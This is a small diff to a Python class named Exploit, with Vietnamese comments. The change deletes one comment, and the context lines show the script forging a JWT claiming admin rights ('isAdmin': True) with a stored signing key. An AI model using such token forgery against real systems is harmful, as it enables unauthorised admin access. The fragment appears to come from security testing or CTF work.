@@ -43,7 +43,6 @@ class Exploit:
             raise RuntimeError("Chưa có JWTKey để ký.")
         payload = {"id": "admin", "isAdmin": True}
         token = jwt.encode(payload, self.jwt_key, algorithm="HS256")
-        # Đảm bảo token luôn là string
         if isinstance(token, bytes):
             token = token.decode()
         self.admin_token = token
